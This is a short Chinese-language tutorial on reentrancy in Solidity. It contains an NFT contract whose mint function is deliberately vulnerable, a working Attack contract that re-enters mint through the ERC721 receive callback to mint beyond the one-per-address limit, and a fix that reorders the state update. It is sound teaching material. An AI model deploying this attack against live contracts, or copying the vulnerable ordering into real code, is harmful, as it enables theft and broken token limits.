# 重入漏洞和修复
> 一定要注重安全

重入漏洞一般出现就是因为代码没有走到修改数据的地方，外部又重新掉函数。导致代码重复执行。

# 漏洞代码
```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "hardhat/console.sol";

contract NFT is ERC721 {
    uint256 public totalSupply;
    mapping(address => bool) public mintedAddress;

    constructor() ERC721("Reentry NFT", "ReNFT"){}

    // 铸造函数，每个用户只能铸造1个NFT
    // 有重入漏洞
    function mint() payable external {
        require(mintedAddress[msg.sender] == false);
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        mintedAddress[msg.sender] = true;
    }
}


contract Attack is IERC721Receiver{
    NFT public nft;

    constructor(NFT _nftAddr) {
        nft = _nftAddr;
    }
    
    // 攻击函数，发起攻击
    function attack() external {
        nft.mint();
    }

    // ERC721的回调函数，会重复调用mint函数，铸造100个
    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        if(nft.balanceOf(address(this)) < 10){
            nft.mint();
        }
        return this.onERC721Received.selector;
    }
}
```

## 代码修复
```solidity
function mint() payable external {
    require(mintedAddress[msg.sender] == false);
    totalSupply++;
    mintedAddress[msg.sender] = true;
    _safeMint(msg.sender, totalSupply);
}
```